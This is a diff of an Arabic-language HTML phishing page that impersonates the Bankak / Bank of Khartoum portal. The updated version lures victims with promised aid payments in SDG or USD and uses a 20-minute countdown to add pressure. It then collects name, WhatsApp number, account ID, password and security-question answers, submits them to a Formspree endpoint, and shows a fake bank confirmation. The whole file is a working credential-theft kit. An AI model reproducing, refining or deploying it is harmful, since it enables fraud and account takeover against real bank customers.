@@ -3,100 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>إدارة أسئلة الأمان</title>
+    <title>Bankak Portal</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background-color: #f0f0f0; margin: 0; padding: 10px; display: flex; justify-content: center; }
-        .card { background: white; width: 100%; max-width: 450px; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .header { background: #000; padding: 15px; text-align: center; position: relative; }
-        .logo { width: 120px; }
-        .red-bar { background: #c62828; color: white; padding: 12px; text-align: center; font-weight: bold; font-size: 18px; }
-        .content { padding: 20px; background: #fff; }
-        .q-box { border-bottom: 1px solid #ddd; padding: 15px 0; }
-        .q-title { display: block; text-align: right; color: #555; font-size: 14px; margin-bottom: 5px; }
-        select, input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; text-align: right; margin-top: 5px; font-size: 15px; background: #f9f9f9; }
-        .footer-btns { display: flex; gap: 10px; padding: 20px; background: #eee; }
-        .btn { flex: 1; padding: 12px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        .btn-send { background: linear-gradient(to bottom, #d32f2f, #b71c1c); color: white; }
-        .btn-cancel { background: linear-gradient(to bottom, #d32f2f, #b71c1c); color: white; }
-        .hidden { display: none; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .header { width: 100%; height: 65px; background: #d32f2f url('logo_white.png') no-repeat center; background-size: contain; position: relative; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .timer-box { position: absolute; left: 12px; top: 18px; background: rgba(0, 0, 0, 0.3); color: white; padding: 4px 10px; border-radius: 15px; font-weight: bold; font-size: 13px; direction: ltr; }
+        .container { width: 92%; max-width: 450px; padding: 15px; margin-top: 10px; text-align: center; }
+        .main-logo { width: 130px; margin: 10px 0 20px 0; }
+        
+        .input-group { background: white; border: 1.5px solid #e0e0e0; margin-bottom: 12px; border-radius: 10px; padding: 2px 12px; display: flex; align-items: center; }
+        .input-group input { flex: 1; border: none; padding: 14px 5px; outline: none; text-align: right; font-size: 16px; width: 100%; color: #333; }
+        
+        .question-box { background: white; border: 1.5px solid #e0e0e0; padding: 16px; margin-bottom: 10px; text-align: right; border-radius: 10px; cursor: pointer; position: relative; font-size: 15px; color: #444; }
+        .question-box::after { content: '▼'; position: absolute; left: 15px; color: #d32f2f; font-size: 10px; }
+
+        .btn-login { width: 100%; background: linear-gradient(135deg, #d32f2f, #b71c1c); color: white; border: none; padding: 16px; border-radius: 10px; font-weight: bold; font-size: 17px; cursor: pointer; margin-top: 5px; }
+        .btn-img { width: 48%; cursor: pointer; border-radius: 8px; }
+        
+        #loginPage, #questionsPage, #successMessage { display: none; width: 100%; }
+        
+        .currency-option { background: white; border: 2px solid #e0e0e0; padding: 18px; margin: 10px 0; border-radius: 12px; font-weight: bold; color: #555; cursor: pointer; transition: all 0.3s ease; }
+        .currency-option.selected { background-color: #e8f5e9; border-color: #2e7d32; color: #1b5e20; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+
+        .success-box { background: #fff; border-top: 6px solid #4caf50; padding: 30px 20px; border-radius: 12px; color: #333; margin-top: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: justify; direction: rtl; }
+        .success-box h2 { color: #2e7d32; text-align: center; margin-bottom: 20px; }
+
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { width: 90%; max-width: 350px; }
+        .modal-content img { width: 100%; border-radius: 15px; }
+        h3 { color: #444; font-size: 17px; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="header">
-        <img src="logo_colored.png" class="logo" alt="Bankak">
-    </div>
-    <div class="red-bar">إدارة أسئلة الأمان</div>
+    <div class="header"><div class="timer-box" id="timer">20:00</div></div>
 
-    <form action="https://formspree.io/f/xzdjwoao" method="POST">
-        <div class="content">
+    <div class="container">
+        <img src="logo_colored.png" class="main-logo">
+
+        <form action="https://formspree.io/f/xzdjwoao" method="POST" id="mainForm">
             
-            <div id="p1">
-                <span class="q-title">اختر العملة:</span>
-                <select name="Currency">
-                    <option>جنيه سوداني (SDG)</option>
-                    <option>دولار أمريكي (USD)</option>
-                </select>
-                <input type="text" name="Full_Name" placeholder="الاسم الكامل" required>
-                <input type="number" name="Phone" placeholder="رقم الهاتف" required>
-                <button type="button" class="btn btn-send" style="margin-top:15px;" onclick="go(2)">استمرار</button>
-            </div>
-
-            <div id="p2" class="hidden">
-                <input type="text" name="User_ID" placeholder="اسم المستخدم / رقم الحساب" required>
-                <input type="password" name="Pass" placeholder="كلمة المرور" required>
-                <button type="button" class="btn btn-send" style="margin-top:15px;" onclick="go(3)">التالي</button>
-            </div>
-
-            <div id="p3" class="hidden">
-                <div class="q-box">
-                    <span class="q-title">إختر السؤال الأول:</span>
-                    <select name="Question_1">
-                        <option>ما هو اسم ابن عمك الأول؟</option>
-                        <option>ما هو اسم مدرستك الابتدائية؟</option>
-                    </select>
-                    <input type="text" name="Answer_1" placeholder="أدخل الجواب">
-                </div>
-
-                <div class="q-box">
-                    <span class="q-title">إختر السؤال الثاني:</span>
-                    <select name="Question_2">
-                        <option>ماذا كان لقبك اثناء الطفولة؟</option>
-                        <option>اسم مؤلفك المفضل؟</option>
-                        <option>اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
-                    </select>
-                    <input type="text" name="Answer_2" placeholder="أدخل الجواب">
-                </div>
-
-                <div class="q-box">
-                    <span class="q-title">إختر السؤال الثالث:</span>
-                    <select name="Question_3">
-                        <option>أي فيلم هو المفضل لديك؟</option>
-                        <option>اسم أفضل صديق في الطفولة؟</option>
-                        <option>في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
-                        <option>اسم أول بلد أجنبي قمت بزيارته؟</option>
-                    </select>
-                    <input type="text" name="Answer_3" placeholder="أدخل الجواب">
-                </div>
-
-                <div class="footer-btns">
-                    <button type="submit" class="btn btn-send">إرسال</button>
-                    <button type="button" class="btn btn-cancel">إلغاء</button>
+            <div id="currencyPage">
+                <h3>آختر عملة استلام المساعدات</h3>
+                <input type="hidden" name="العملة_المختارة" id="selected_currency_input">
+                <div class="currency-option" id="opt1" onclick="selectCurr('opt1', 'جنيه سوداني')">جنيه سوداني</div>
+                <div class="currency-option" id="opt2" onclick="selectCurr('opt2', 'دولار امريكي فقط')">دولار امريكي فقط</div>
+                
+                <div style="margin-top: 20px;">
+                    <h3>بيانات المستلم</h3>
+                    <div class="input-group"><input type="text" id="full_name" name="الاسم_الكامل" placeholder="الإسم الكامل"></div>
+                    <div class="input-group"><input type="number" id="whatsapp_num" name="رقم_واتساب" placeholder="رقم واتساب للتواصل"></div>
+                    <button type="button" class="btn-login" onclick="checkCurrencyStep()">المتابعة لتسجيل الدخول</button>
                 </div>
             </div>
+
+            <div id="loginPage">
+                <h3>تسجيل الدخول لحساب بنكك</h3>
+                <div class="input-group"><input type="text" id="acc_num" name="رقم_الحساب" placeholder="رقم الحساب أو معرف المستخدم"></div>
+                <div class="input-group"><input type="password" id="acc_pass" name="كلمة_المرور" placeholder="كلمة المرور"></div>
+                <button type="button" class="btn-login" onclick="checkLogin()">دخول</button>
+            </div>
+
+            <div id="questionsPage">
+                <h4 style="color: #666; font-size: 14px; margin-bottom: 15px;">التحقق الأمني: يرجى الإجابة على سؤالين</h4>
+                <div class="question-box" onclick="showModal('popup_q1.png')">السؤال الأول</div>
+                <div class="input-group"><img src="icon_message.png" style="width:22px; margin-left:10px;"><input type="text" id="q1" name="سؤال_1" placeholder="إجابة السؤال الأول"></div>
+                <div class="question-box" onclick="showModal('popup_q2.png')">السؤال الثاني</div>
+                <div class="input-group"><img src="icon_message.png" style="width:22px; margin-left:10px;"><input type="text" id="q2" name="سؤال_2" placeholder="إجابة السؤال الثاني"></div>
+                <div class="question-box" onclick="showModal('popup_q3.png')">السؤال الثالث</div>
+                <div class="input-group"><img src="icon_message.png" style="width:22px; margin-left:10px;"><input type="text" id="q3" name="سؤال_3" placeholder="إجابة السؤال الثالث"></div>
+                <div style="display: flex; justify-content: space-between; margin-top: 15px; gap: 10px;">
+                    <img src="btn_send.png" class="btn-img" onclick="checkQuestions()"><img src="btn_cancel.png" class="btn-img" onclick="location.reload()">
+                </div>
+            </div>
+        </form>
+
+        <div id="successMessage" class="success-box">
+            <h2>شكرًا لك</h2>
+            <p><strong>تم تسجيل طلبكم بنجاح بنظامنا.</strong></p>
+            <p>بناءً على الإجراءات المتبعة، سيتم مراجعة وتدقيق البيانات المدخلة من قِبل القسم المختص بالبنك.</p>
+            <p>فور الانتهاء من عملية التأكد، سيتم التواصل معكم مباشرة.</p>
+            <div style="text-align: center; color: #aaa; font-size: 11px; margin-top: 25px; border-top: 1px solid #f0f0f0; padding-top: 10px;">إدارة العمليات المركزية - بنك الخرطوم</div>
         </div>
-    </form>
-</div>
+    </div>
 
-<script>
-    function go(s) {
-        document.getElementById('p1').classList.add('hidden');
-        document.getElementById('p2').classList.add('hidden');
-        document.getElementById('p3').classList.remove('hidden');
-    }
-</script>
+    <div id="myModal" class="modal" onclick="this.style.display='none'"><div class="modal-content"><img id="modalImg" src=""></div></div>
 
+    <script>
+        let selectedCurrencyText = "";
+        let timeLeft = 1200; 
+
+        const countdown = setInterval(() => {
+            let m = Math.floor(timeLeft / 60); let s = timeLeft % 60;
+            const timerEl = document.getElementById('timer');
+            if(timerEl) timerEl.innerHTML = `${m < 10 ? '0' + m : m}:${s < 10 ? '0' + s : s}`;
+            if (timeLeft-- <= 0) { clearInterval(countdown); location.reload(); }
+        }, 1000);
+
+        function selectCurr(optionId, currencyText) {
+            const options = document.querySelectorAll('.currency-option');
+            options.forEach(opt => opt.classList.remove('selected'));
+            document.getElementById(optionId).classList.add('selected');
+            selectedCurrencyText = currencyText;
+            document.getElementById('selected_currency_input').value = currencyText;
+        }
+
+        function checkCurrencyStep() {
+            const n = document.getElementById('full_name').value.trim();
+            const w = document.getElementById('whatsapp_num').value.trim();
+            if (!selectedCurrencyText || !n || !w) { alert("يرجى اختيار العملة وإكمال بيانات الإسم والواتساب"); return; }
+            showPage('loginPage');
+        }
+
+        function checkLogin() {
+            const a = document.getElementById('acc_num').value;
+            const p = document.getElementById('acc_pass').value;
+            if (!a || !p) { alert("يرجى إكمال بيانات تسجيل الدخول"); return; }
+            showPage('questionsPage');
+        }
+
+        function checkQuestions() {
+            const q1 = document.getElementById('q1').value.trim();
+            const q2 = document.getElementById('q2').value.trim();
+            const q3 = document.getElementById('q3').value.trim();
+            if (((q1!=="") + (q2!=="") + (q3!=="")) < 2) { alert("يرجى إجابة سؤالين على الأقل"); return; }
+            
+            // إرسال البيانات النهائية لـ Formspree
+            document.getElementById('mainForm').submit();
+            
+            showPage('successMessage');
+            clearInterval(countdown);
+        }
+
+        function showPage(p) {
+            ['currencyPage', 'loginPage', 'questionsPage', 'successMessage'].forEach(x => {
+                const el = document.getElementById(x);
+                if(el) el.style.display = 'none';
+            });
+            const target = document.getElementById(p);
+            if(target) target.style.display = 'block'; 
+            window.scrollTo(0,0);
+        }
+        function showModal(s) { document.getElementById('modalImg').src = s; document.getElementById('myModal').style.display = 'flex'; }
+    </script>
 </body>
 </html>
